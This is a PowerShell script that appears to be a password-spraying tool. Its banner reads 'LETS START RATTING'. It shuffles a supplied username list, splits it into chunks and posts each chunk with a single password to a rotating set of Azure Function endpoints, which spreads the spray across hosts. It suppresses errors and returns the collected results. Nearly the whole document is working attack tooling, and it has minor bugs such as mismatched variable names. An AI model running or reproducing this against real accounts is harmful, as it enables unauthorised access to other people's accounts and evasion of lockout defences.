Param(
    [Parameter(Mandatory = $False,
        Position = 0)]
    [array]$Payload = "",

    [Parameter(Mandatory = $False,
        Position = 0)]
    [array]$password = "",

    [Parameter(Mandatory = $False,
        Position = 3)]
    [string]$OutFile = "",

    [Parameter(Mandatory = $False,
        Position = 4)]
    [int]$chunkSize,

    [Parameter(Mandatory = $False,
        Position = 5)]
    [string]$FunctionPrefix = "devnedspray",

    [Parameter(Mandatory = $False,
        Position = 6)]
    [int]$hostCount = 3
)

#Region logo
$logo = '   
                                         ╓╓╓╖╖╖╖╖╓╓╓┌                              
         └└ ╙╙╙╩╦╖╖┌                 ╒╓╬╬╬╬╬╫╬╬╬╬╬╬╬╬╬╬╬╬╦╥╥╖╬╬╬╖                   
                   └╙╙┬╦╖╓╓┌┌  ╓╓╓╓╦╦╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╫╬╜╬╬╬╖                
                          └└╙╙╙╙╙└└   ╟╬╬╬╬╬╫╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╖             
                                      ╬╙╨╨╩╬╬╬╬╩╩╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╩╩╨╬╨╩╙
                                       ╙╙└          ╙╘┘      └╙╙╙╙

                                       
                -- L E T S   S T A R T   R A T T I N G --
'
#EndRegion Logo

function DivideList {
    param(
        [object[]]$list,
        [int]$chunkSize
    )

    for ($i = 0; $i -lt $list.Count; $i += $chunkSize) {
        $userList = ( $list | Select-Object -First $chunkSize -Skip $i )
         if ($hostCount) {
             $hostvalue++
             $uri = 'https://{0}{1}.azurewebsites.net/api/post?l3tsSpr@y&password={2}' -f "$FunctionPrefix", "$hostvalue", "$password"
             Write-Host "$uri"
             $fullresults += Invoke-RestMethod -Uri $uri -Body ($userList | ConvertTo-Json) -ContentType 'application/json' -Method Post    
        
            if ($hostcount -eq $hostvalue) {
                    $hostvalue = 0
                    write-Host "Reset Host Value"
                }
            } else {
            $fullresults += Invoke-RestMethod -Uri $uri -Body ($userList | ConvertTo-Json) -ContentType 'application/json' -Method Post
        }
    }

    return $fullresults
}

Clear-Host
Write-Host $logo -ForegroundColor Green
$ErrorActionPreference = 'silentlycontinue'
$usernames = $Payload | Sort-Object { Get-Random }
$currenttime = Get-Date
$count = $Usernames.count
$script:fullresults = @()
$hostvalue = 0

Write-Host -ForegroundColor "yellow" ("[*] There are " + $count + " total users to spray.")
Write-Host -ForegroundColor "yellow" "[*] Current date and time: $currenttime"

$uri = 'https://{0}.azurewebsites.net/api/post?code=l3tsSpr@y&password=$($passwords)' -f "$functionPrefix"

$resultList = DivideList -list $Payload -chunkSize $chunkSize
return $resultList